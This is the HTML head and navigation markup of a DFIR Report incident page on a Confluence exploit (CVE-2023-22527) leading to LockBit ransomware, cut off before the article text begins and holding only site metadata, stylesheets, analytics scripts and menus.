<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<title>Confluence Exploit Leads to LockBit Ransomware &#8211; The DFIR Report</title>
			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 			 <meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='preconnect' href='//c0.wp.com' />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="060ba8aeb0a074cb9676a9a8-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel='stylesheet' id='jetpack_related-posts-css' href='https://c0.wp.com/p/jetpack/14.3/modules/related-posts/related-posts.css' type='text/css' media='all' />
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://c0.wp.com/c/6.7.2/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='mediaelement-css' href='https://c0.wp.com/c/6.7.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css' href='https://c0.wp.com/c/6.7.2/wp-includes/js/mediaelement/wp-mediaelement.min.css' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css' type='text/css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='freenews-style-css' href='https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.7.2' type='text/css' media='all' />
<style id='freenews-style-inline-css' type='text/css'>
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel='stylesheet' id='font-awesome-css' href='https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.7.2' type='text/css' media='all' />
<link rel='stylesheet' id='freenews-google-fonts-css' href='https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css' type='text/css' media='all' />
<style id='akismet-widget-style-inline-css' type='text/css'>

			.a-stats {
				--akismet-color-mid-green: #357b49;
				--akismet-color-white: #fff;
				--akismet-color-light-grey: #f6f7f7;

				max-width: 350px;
				width: auto;
			}

			.a-stats * {
				all: unset;
				box-sizing: border-box;
			}

			.a-stats strong {
				font-weight: 600;
			}

			.a-stats a.a-stats__link,
			.a-stats a.a-stats__link:visited,
			.a-stats a.a-stats__link:active {
				background: var(--akismet-color-mid-green);
				border: none;
				box-shadow: none;
				border-radius: 8px;
				color: var(--akismet-color-white);
				cursor: pointer;
				display: block;
				font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen-Sans', 'Ubuntu', 'Cantarell', 'Helvetica Neue', sans-serif;
				font-weight: 500;
				padding: 12px;
				text-align: center;
				text-decoration: none;
				transition: all 0.2s ease;
			}

			/* Extra specificity to deal with TwentyTwentyOne focus style */
			.widget .a-stats a.a-stats__link:focus {
				background: var(--akismet-color-mid-green);
				color: var(--akismet-color-white);
				text-decoration: none;
			}

			.a-stats a.a-stats__link:hover {
				filter: brightness(110%);
				box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06), 0 0 2px rgba(0, 0, 0, 0.16);
			}

			.a-stats .count {
				color: var(--akismet-color-white);
				display: block;
				font-size: 1.5em;
				line-height: 1.4;
				padding: 0 13px;
				white-space: nowrap;
			}
		
</style>
<link rel='stylesheet' id='sharedaddy-css' href='https://c0.wp.com/p/jetpack/14.3/modules/sharedaddy/sharing.css' type='text/css' media='all' />
<link rel='stylesheet' id='social-logos-css' href='https://c0.wp.com/p/jetpack/14.3/_inc/social-logos/social-logos.min.css' type='text/css' media='all' />
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://c0.wp.com/p/jetpack/14.3/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://c0.wp.com/c/6.7.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://c0.wp.com/c/6.7.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="060ba8aeb0a074cb9676a9a8-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/42179" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.2" />
<link rel="canonical" href="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/" />
<link rel='shortlink' href='https://thedfirreport.com/?p=42179' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2025%2F02%2F24%2Fconfluence-exploit-leads-to-lockbit-ransomware%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2025%2F02%2F24%2Fconfluence-exploit-leads-to-lockbit-ransomware%2F&#038;format=xml" />

		<!-- GA Google Analytics @ https://m0n.co/ga -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="060ba8aeb0a074cb9676a9a8-text/javascript"></script>
		<script type="060ba8aeb0a074cb9676a9a8-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>

	<script type="060ba8aeb0a074cb9676a9a8-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=31783430D2B4CA6246F5723A7C9C5B82');
</script>	<style>img#wpstats{display:none}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
	
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Confluence Exploit Leads to LockBit Ransomware" />
<meta property="og:url" content="https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/" />
<meta property="og:description" content="Key Takeaways The intrusion began with the exploitation of CVE-2023-22527 on an exposed Windows Confluence server, ultimately leading to the deployment of LockBit ransomware across the environment.…" />
<meta property="article:published_time" content="2025-02-24T00:06:37+00:00" />
<meta property="article:modified_time" content="2025-02-24T15:10:42+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2025/02/27244_001.jpg" />
<meta property="og:image:width" content="1717" />
<meta property="og:image:height" content="1109" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Confluence Exploit Leads to LockBit Ransomware" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2025/02/27244_001.jpg?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>

<body class="post-template-default single single-post postid-42179 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
	<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header">
		<div id="main-header" class="main-header">
			<div class="navigation-top">
        		<div class="wrap">
            	<div id="site-header-menu" class="site-header-menu">
               	<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
							    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
        <span class="toggle-bar"></span>
    </button>

    <ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
	<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
	<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
	<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
	<ul class="sub-menu">
		<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
		<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
		<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
	</ul>
</li>
	<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
	<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
	<ul class="sub-menu">
		<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
		<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul>						 </nav><!-- #site-navigation -->
           		</div>
        		</div><!-- .wrap -->
			</div><!-- .navigation-top -->
			       <nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
            <div class="wrap">
                <button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                    <span class="secondary-toggle-text">Menu</span>
                    <span class="secondary-toggle-bar"></span>
                </button>
                <ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
	<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
	<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
	<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
	<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
	<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul>            </div><!-- .wrap -->
        </nav><!-- .secondary-navigation -->       
			<div class="main-header-brand">
				<div class="header-brand">
					<div class="wrap">
						<div class="header-brand-content">
							    <div class="site-branding">
                <div class="site-branding-text">

                           <p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
                                <p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
            
        </div><!-- .site-branding-text -->
    </div><!-- .site-branding -->


							<div class="header-right">
								<div class="header-banner">

																	</div><!-- .header-banner -->
							</div><!-- .header-right -->
						</div><!-- .header-brand-content -->
					</div><!-- .wrap -->
				</div><!-- .header-brand -->

				<div id="nav-sticker">
					<div class="navigation-top">
						<div class="wrap">
							<div id="site-header-menu" class="site-header-menu">
								<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
								    <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
        <span class="toggle-text">Menu</span>
